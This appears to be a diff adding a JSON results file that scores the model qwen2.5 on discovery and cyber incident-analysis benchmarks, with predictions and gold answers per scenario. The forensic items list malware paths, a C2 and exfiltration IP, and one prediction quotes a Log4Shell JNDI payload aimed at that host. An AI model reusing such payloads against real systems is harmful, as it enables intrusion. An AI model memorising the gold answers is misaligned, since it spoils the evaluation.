@@ -1,0 +1,177 @@
+{
+  "generated_at": "2026-11-10T17:18:37.684Z",
+  "model": "qwen2.5",
+  "provider": "ollama",
+  "datasets": [
+    {
+      "dataset": "DiscoveryBench",
+      "model": "qwen2.5",
+      "scenarios": 3,
+      "completed": 3,
+      "mean_score": 0.3327
+    },
+    {
+      "dataset": "DiscoveryWorld",
+      "model": "qwen2.5",
+      "scenarios": 3,
+      "completed": 3,
+      "mean_score": 0.3333
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "model": "qwen2.5",
+      "scenarios": 5,
+      "completed": 5,
+      "mean_score": 0.92
+    },
+    {
+      "dataset": "Cyber-AIT-ADS",
+      "model": "qwen2.5",
+      "scenarios": 3,
+      "completed": 3,
+      "mean_score": 0.6667
+    }
+  ],
+  "scenarios": [
+    {
+      "dataset": "DiscoveryBench",
+      "scenario": "archaeology/metadata_0/q0",
+      "model": "qwen2.5",
+      "score": 0.1714,
+      "status": "completed",
+      "detail": "token_f1 vs gold hypothesis",
+      "prediction": "The given text does not contain any information about the frequency of axes in any century. The text appears to be a series of numerical values separated by commas, possibly representing data points for some kind of measurement or analysis. Without additional context, it's not possible to determine from this data alone when axes became quantitatively most frequent. Therefore, the hypothesis cannot be confirmed or denied based on the provided information.",
+      "gold": "At the end of the 4th millennium BCE, axes become quantitatively most frequent."
+    },
+    {
+      "dataset": "DiscoveryBench",
+      "scenario": "nls_incarceration/metadata_0/q0",
+      "model": "qwen2.5",
+      "score": 0.6667,
+      "status": "completed",
+      "detail": "token_f1 vs gold hypothesis",
+      "prediction": "The year 1996 had the highest gender disparity in median wealth among individuals who were ever incarcerated.",
+      "gold": "Gender disparities was highest in median wealth in 1985 among individuals who were ever incarcerated"
+    },
+    {
+      "dataset": "DiscoveryBench",
+      "scenario": "worldbank_education_gdp/metadata_0/q0",
+      "model": "qwen2.5",
+      "score": 0.16,
+      "status": "completed",
+      "detail": "token_f1 vs gold hypothesis",
+      "prediction": "Based on the data provided, it's challenging to directly draw a conclusion about regions where increased education spending positively impacts per capita GDP. The data given includes time series for adjusted education expenditure as a percentage of GNI and per capita GDP for different income groups, but it does not explicitly link these two metrics to show a positive impact of education spending on GDP.\n\nTo properly test the hypothesis, we would need additional data that directly correlates educ",
+      "gold": "Increase in education expenditure generates a positive impact on per capita GDP in developing countries"
+    },
+    {
+      "dataset": "DiscoveryWorld",
+      "scenario": "Space Sick/Easy/seed0",
+      "model": "qwen2.5",
+      "score": 0.0,
+      "status": "completed",
+      "detail": "critical-hypothesis keyword coverage",
+      "prediction": "The key discovery is that the spectrometer can detect the pathogen in the mushrooms. By analyzing each mushroom with the spectrometer, the agent can identify the contaminated one and place it in the jar for further analysis and disposal.",
+      "gold": "One of the food items is contaminated with `Bacterium Species 138`, which can be measured with the densitometer."
+    },
+    {
+      "dataset": "DiscoveryWorld",
+      "scenario": "Combinatorial Chemistry/Easy/seed0",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "critical-hypothesis keyword coverage",
+      "prediction": "The key is contaminated with rust, and the rust remover is Substance A. Placing the rusted key in the jar with Substance A will remove the rust, allowing the key to open the door.",
+      "gold": "If the key is placed in a mixture of pure Substance B, then the rust will be removed."
+    },
+    {
+      "dataset": "DiscoveryWorld",
+      "scenario": "Archaeology Dating/Easy/seed0",
+      "model": "qwen2.5",
+      "score": 0.0,
+      "status": "completed",
+      "detail": "critical-hypothesis keyword coverage",
+      "prediction": "The ancient artifact with the oldest age is the one directly west of the radiocarbon meter. Placing the red flag beside it will complete the task.",
+      "gold": "The artifact with an age of 675000 years is the oldest. The ages of the other artifacts (in years) are: 150000, 500000."
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "scenario": "case-01-recon/q-c01-root-cause",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "grading=exact_ci; attck=T1105,T1071.001",
+      "prediction": "/tmp/.sysupdate",
+      "gold": "/tmp/.sysupdate"
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "scenario": "case-01-recon/q-c01-c2-ip",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "grading=exact_ci; attck=T1071.001",
+      "prediction": "204.168.178.42",
+      "gold": "204.168.178.42"
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "scenario": "case-02-collection-exfil/q-c02-archive",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "grading=exact_ci; attck=T1560.001",
+      "prediction": "/tmp/.stage.tgz",
+      "gold": "/tmp/.stage.tgz"
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "scenario": "case-02-collection-exfil/q-c02-exfil-dest",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "grading=exact_ci; attck=T1041",
+      "prediction": "204.168.178.42:8080",
+      "gold": "204.168.178.42:8080"
+    },
+    {
+      "dataset": "Cyber-SecOps-ES",
+      "scenario": "case-03-web-exploit-revshell/q-c03-webtools",
+      "model": "qwen2.5",
+      "score": 0.6,
+      "status": "completed",
+      "detail": "grading=set_f1; attck=T1595,T1190",
+      "prediction": "sqlmap/1.7, Nikto/2.5.0, ${jndi:ldap://204.168.178.42:1389/a}",
+      "gold": "sqlmap, nikto, log4shell"
+    },
+    {
+      "dataset": "Cyber-AIT-ADS",
+      "scenario": "russellmitchell/network_scans",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "exact_ci attack-stage label",
+      "prediction": "network_scans",
+      "gold": "network_scans"
+    },
+    {
+      "dataset": "Cyber-AIT-ADS",
+      "scenario": "russellmitchell/webshell",
+      "model": "qwen2.5",
+      "score": 1.0,
+      "status": "completed",
+      "detail": "exact_ci attack-stage label",
+      "prediction": "webshell",
+      "gold": "webshell"
+    },
+    {
+      "dataset": "Cyber-AIT-ADS",
+      "scenario": "russellmitchell/dirb",
+      "model": "qwen2.5",
+      "score": 0.0,
+      "status": "completed",
+      "detail": "exact_ci attack-stage label",
+      "prediction": "webshell",
+      "gold": "dirb"
+    }
+  ]
+}
